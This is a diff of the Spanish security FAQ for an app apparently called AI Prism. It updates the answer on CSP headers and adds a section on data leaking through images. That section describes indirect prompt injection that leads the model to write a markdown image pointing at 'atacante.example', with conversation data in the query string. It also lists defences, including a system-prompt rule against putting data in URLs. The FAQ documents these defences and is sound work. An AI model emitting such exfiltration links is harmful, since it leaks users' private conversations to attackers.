@@ -1,4 +1,4 @@
-<!-- i18n: source=docs/security-faq.md source-hash=f97d5d39b35d3639a1a1036f02047e0edaff6736 status=machine -->
+<!-- i18n: source=docs/security-faq.md source-hash=c179d40c56812b62be5c3a5e2e0bbe47dce3c8d7 status=current -->
 # Preguntas frecuentes de seguridad de AI Prism
 
 [English](../security-faq.md) · [Português (Brasil)](../pt-BR/security-faq.md) · **Español**
@@ -155,12 +155,12 @@ Sí, en el fetch web (`server/web.ts`): bloquea `localhost`, IPs privadas (IPv4 
 
 ### 15. ¿La aplicación tiene headers de seguridad (CSP, HSTS)?
 
-**Parcial (G6).** En cada respuesta la app define `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` y `Permissions-Policy: microphone=(self), camera=()` (el micrófono solo para el dictado de la propia app), elimina `X-Powered-By` y envía dos CSP:
+**Sí para los headers (G6); HSTS y TLS quedan con el proxy de Apps.** En cada respuesta la app define `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`, `X-Frame-Options: SAMEORIGIN` y `Permissions-Policy: microphone=(self), camera=()` (el micrófono solo para el dictado de la propia app), quita `X-Powered-By` y envía dos CSP:
 
-- **Aplicada**, conservadora: `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'` (`server/securityHeaders.ts`).
-- **Report-only**, la política objetivo: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:; frame-ancestors 'none'` (`server/middleware/security.ts`). El navegador no bloquea nada con ella; solo reporta a `POST /api/csp-report`, que registra una línea JSON por violación con la directiva, el origen bloqueado, la ruta del documento y la disposición, sin query string, muestra ni identidad.
+- **Aplicada** (`server/securityHeaders.ts`): `frame-ancestors 'self'; base-uri 'self'; object-src 'none'; form-action 'self'; default-src 'self'; script-src 'self' 'unsafe-inline'` más las directivas de salida `img-src`, `font-src`, `style-src`, `media-src`, `connect-src` y `frame-src` (la propia app, `data:`, `blob:` y los orígenes que un admin permitió para imágenes, fuentes y estilos). Vale desde la 2.0.0. `CSP_EGRESS=report` quita las directivas de salida y de script (vea la [pregunta 21](#21-puede-el-modelo-filtrar-datos-por-una-imagen-o-un-enlace-en-una-respuesta)).
+- **Report-only**, la política objetivo más estricta: `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; frame-src 'self' blob:; frame-ancestors 'none'` (`server/middleware/security.ts`). El navegador no bloquea nada con ella; solo reporta a `/api/csp-report`, que registra `csp_violation` con la directiva y el origen bloqueado, nunca ruta ni query.
 
-La política objetivo todavía no se aplica porque los iframes `srcdoc` de los decks y de las vistas previas de design system heredan la política de la página y necesitan scripts en línea y assets del design system en otros hosts (el motivo está en [SECURITY.md](SECURITY.md#protecciones-http)). Los reportes recogidos son la evidencia necesaria antes de aplicarla. `Referrer-Policy` queda en `same-origin`, más estricta que `strict-origin-when-cross-origin`: los sitios externos no reciben ningún referrer. HSTS viene del proxy de Apps. Lo que el proxy agrega a la respuesta no se ha verificado (modelo de amenazas §7.1).
+`script-src` mantiene `'unsafe-inline'` porque los iframes `srcdoc` de los decks y de las vistas previas de design system heredan la política de la página y usan script en línea. Un script remoto se bloquea; el script en línea en un frame aislado no, así que WebRTC desde esos frames sigue abierto hasta que tengan su propio origen (detalles en [SECURITY.md](SECURITY.md#protecciones-http)).
 
 ---
 
@@ -208,3 +208,22 @@ Por el canal privado de GitHub (la pestaña **Security**), como se describe en [
 - **Cómo borrar:** el usuario elimina una entrada o todas (`DELETE /api/memory/:id`, `DELETE /api/memory`). "Olvidar todo" también graba una marca por usuario (`user_memory_state.forgot_at`), así que una extracción aún en curso en cualquier instancia de la app no escribe nada después; eliminar un chat no borra lo aprendido de él. Un administrador desactiva la función con la clave de política de herramientas `memory` (Configuración → Herramientas): no se aprende, no se inyecta ni se lista nada; las filas guardadas quedan hasta que su dueño las elimine, y eliminar sigue funcionando. Revertir la migración 0006 borra la tabla y todas las entradas.
 
 *Plataforma:* el mismo cifrado, residencia y backups de Lakebase que el resto de los datos.
+
+---
+
+### 21. ¿Puede el modelo filtrar datos por una imagen o un enlace en una respuesta?
+
+**Versiones anteriores a la 2.0.0: sí. Actualice a la 2.0.0.** El ataque: el texto que el modelo escribe (inducido por un documento, una página web o un resultado de herramienta que leyó) contiene `![x](https://atacante.example/p.png?d=<parte de la conversación>)`. El navegador carga la imagen por su cuenta, sin clic, y el servidor del atacante recibe la query string. Lo mismo vale para una imagen, fuente u hoja de estilos remota en un documento o slide, y para una llamada de herramienta cuyos argumentos llevan los datos.
+
+Qué hace la 2.0.0, en capas (cada una aguanta si otra falla):
+
+- **Navegador (CSP, aplicada por defecto).** Imágenes, fuentes, estilos, medios, conexiones y frames solo cargan desde la propia app, `data:` y `blob:`; los scripts remotos se bloquean. Un solo header cubre el texto en streaming, el historial, documentos, slides de deck, el frame de exportación y la ventana de impresión. Un admin puede permitir un origen para imágenes, fuentes y estilos en Configuración > Administradores > *Orígenes externos de recursos* (sin nuevo deploy), o `EXTERNAL_ASSET_ORIGINS` en `app.yaml`.
+- **Marcador.** Una imagen externa en una respuesta del chat o en un documento se muestra como un marcador no interactivo con el nombre del host. No hay botón "cargar de todos modos": el clic enviaría los datos.
+- **Sanitizador de decks, al guardar y al leer.** El HTML del slide pierde manejadores de eventos, URL `javascript:`, `<base>`, `<meta http-equiv>`, `<link>`, frames, formularios y `src`, `srcset`, `url()` y `@import` remotos. Leer un deck limpia también slides antiguos y copias de conversaciones, así que no hay que guardar de nuevo.
+- **Regla de `web_fetch`.** Solo abre una URL que el usuario escribió o que un resultado de `web_search`/`web_fetch` listó. Una URL que solo escribió el modelo, o que vino de un resultado de Genie, MCP o archivo, se rechaza.
+- **Regla en el prompt de sistema.** Se le indica al modelo que no ponga datos de la conversación, de herramientas o de archivos en una URL. Es una pista, no una barrera.
+- **Descargas de artefactos.** Las imágenes y exportaciones almacenadas se sirven con una CSP de sandbox y `nosniff`. Las descargas, exportaciones e imágenes almacenadas que no son raster (como SVG) reciben además `Content-Disposition: attachment`; una imagen raster (PNG, JPEG...) que la app carga como `<img>` sigue en línea. Abrir cualquiera como página no ejecuta nada.
+- **Logs.** `egress_blocked` (servidor) y `csp_violation` (navegador) registran el intento. Los valores que llevan una URL nunca conservan ruta ni query: `egress_blocked.hosts` guarda nombres de host, y `csp_violation.blocked` guarda un origen (esquema, host y puerto no predeterminado) o una palabra clave de la CSP (`inline`, `eval`, `data`, `blob`); el valor se recorta a 120 caracteres, así que un origen muy largo puede quedar cortado, sin marcador. `egress_blocked` registra `surface`, `kind`, `hosts`, `count`, `route` y `truncated` solo cuando es verdadero; `csp_violation` registra `directive`, `blocked`, `disposition` y `document` solo para un frame `about:srcdoc` o `about:blank`; el logger agrega `request_id`, `user_hash` y `route` ([operations.md §6.17](operations.md#617-csp-de-salida-200-permitir-un-origen-interruptor-de-emergencia-leer-los-logs)).
+
+*Plataforma:* la política de red serverless decide si la herramienta Python alcanza internet; manténgala restrictiva.
+*App:* todo lo anterior. *No cubierto:* una herramienta MCP externa que escribe o publica, si un admin la habilitó (revíselas), y WebRTC desde script en línea en frames aislados (previsto para la 2.x).
